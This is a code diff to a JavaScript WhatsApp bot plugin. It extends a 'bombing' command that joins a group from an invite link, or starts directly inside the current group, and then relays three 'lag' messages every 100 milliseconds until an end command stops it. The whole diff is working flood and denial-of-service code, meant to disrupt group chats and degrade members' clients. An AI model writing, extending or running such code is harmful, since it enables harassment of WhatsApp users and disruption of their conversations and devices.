@@ -53,11 +53,17 @@ let handler = async (m, { conn, isOwner }) => {
   const matchJoin = text.match(/^Ω\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)$/i)
   if (matchJoin) {
     const inviteLink = matchJoin[1]
+    const groupCode = inviteLink.split('/')[3]
     try {
-      const groupCode = inviteLink.split('/')[3]
-      const groupId = await conn.groupAcceptInvite(groupCode)
-      activeBombing = true
+      let groupId
+      try {
+        groupId = await conn.groupAcceptInvite(groupCode)
+      } catch {
+        groupId = await conn.groupGetInviteInfo(groupCode)
+        groupId = groupId.id
+      }
 
+      activeBombing = true
       bombingInterval = setInterval(async () => {
         if (!activeBombing) return
         try {
@@ -69,15 +75,34 @@ let handler = async (m, { conn, isOwner }) => {
         }
       }, 100)
 
-      await m.reply(`💣 Entré al grupo y comencé el bombardeo cada 100ms con triple impacto.`)
+      await m.reply(`💣 Bombardeo iniciado en el grupo.`)
     } catch (err) {
-      await m.reply(`❌ Error al entrar al grupo: ${err}`)
+      await m.reply(`❌ Error al procesar el grupo: ${err}`)
     }
     return
   }
 
-  // Comando Ω end
-  if (/^Ω\s+end$/i.test(text)) {
+  // Comando Ω dentro del grupo
+  if (/^Ω$/i.test(text) && m.isGroup) {
+    const groupId = m.chat
+    activeBombing = true
+    bombingInterval = setInterval(async () => {
+      if (!activeBombing) return
+      try {
+        for (let i = 0; i < 3; i++) {
+          await conn.relayMessage(groupId, buildLagMessage(), { messageId: conn.generateMessageTag() })
+        }
+      } catch (err) {
+        console.error('Error en bombardeo:', err)
+      }
+    }, 100)
+
+    await m.reply(`💣 Bombardeo iniciado en este grupo.`)
+    return
+  }
+
+  // Comando Ω end desde PV
+  if (/^Ω\s+end$/i.test(text) && !m.isGroup) {
     activeBombing = false
     if (bombingInterval) clearInterval(bombingInterval)
     await m.reply('🛑 Bombardeo detenido.')
@@ -86,8 +111,8 @@ let handler = async (m, { conn, isOwner }) => {
 }
 
 handler.command = new RegExp
-handler.customPrefix = /^¤(?:-\d{1,3})?$|^Ω\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)$|^Ω\s+end$/i
+handler.customPrefix = /^¤(?:-\d{1,3})?$|^Ω(\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)|\s+end)?$/i
 handler.tags = ['owner']
-handler.help = ['¤-n', 'Ω <link>', 'θ']
+handler.help = ['¤-n', 'Ω <link>', 'Ω', 'θ']
 
 export default handler
